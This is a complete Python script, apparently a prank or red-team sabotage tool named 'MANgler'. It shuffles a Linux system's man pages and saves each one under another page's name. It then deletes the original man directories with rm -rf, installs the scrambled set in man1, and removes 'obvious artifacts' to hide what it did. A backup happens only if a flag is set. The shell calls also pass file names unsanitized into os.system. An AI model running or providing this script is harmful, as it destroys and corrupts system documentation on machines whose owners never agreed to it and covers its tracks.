import os
import random

ROOTS = [f"man{i}" for i in range(1,9)]
PATH = "/usr/share/man/"
DEBUG = False
BACKUP = True

# Make a list of all man page files
def makeFileList(path):
    manList = list()
    for root, dirs, files in os.walk(f"{path}", topdown=True):
            rootpath = root.split("/")
            if rootpath[4] in ROOTS:
                for name in files:
                    manList.append(os.path.join(root,name))
    return manList

# Removes the original man pages to prevent indexing
def deleteManFiles():
    for i in range(1,10):
        os.system(f"rm -rf /usr/share/man/man{i}")

# Backup the original man pages because I'm not that evil 
def makeManBackup():
    for i in range(1,10):
        os.system(f"cp -rf /usr/share/man/man{i} /usr/share/man/MAN_PAGE_BACKUP")

# Remove artifacts from MANgler
def cleanup():
    os.system("rm -rf /usr/share/man/temp")
    os.system("rm -rf /usr/share/man/hell")


def main():

    # Create a list of all the man files and create a backup
    manList = makeFileList(PATH)
    os.system("mkdir /usr/share/man/MAN_PAGE_BACKUP")
    if BACKUP: makeManBackup()

    # Make the directories that are used to store man pages
    os.system("mkdir /usr/share/man/temp")
    os.system("mkdir /usr/share/man/hell")

    # Randomizes the man pages to place them out of order
    random.shuffle(manList) 

    # Places the man pages into a temporary directory 
    for file in manList:
        os.system(f"cp {file} /usr/share/man/temp")
    
    # Optional debug printing see man pages size
    if DEBUG: print("[DEBUG] Manlist Size:", len(manList))

    # For every man page in the random list, copy it to the name of the next file
    # of the script
    for i in range(len(manList)):
        if i == len(manList)-1:
            file = manList[i].rsplit('/', 1)[-1]
            nextfile = manList[0].rsplit('/', 1)[-1]
            if DEBUG: print(f"[DEBUG] Copying Value {i} into {0}")
            os.system(f"cp /usr/share/man/temp/{file} /usr/share/man/hell/{nextfile}")
        else:
            file = manList[i].rsplit('/', 1)[-1]
            nextfile = manList[i+1].rsplit('/', 1)[-1]
            if DEBUG: print(f"[DEBUG] Copying Value {i} into {i+1}")
            os.system(f"cp /usr/share/man/temp/{file} /usr/share/man/hell/{nextfile}")

    # Delete the files to prevent indexing
    deleteManFiles()

    # Copy the master man page file into man1 to be indexed 
    os.system("cp -rf /usr/share/man/hell /usr/share/man/man1")

    # Remove obvious artifacts 
    cleanup()
   


if __name__ == "__main__":
    main()
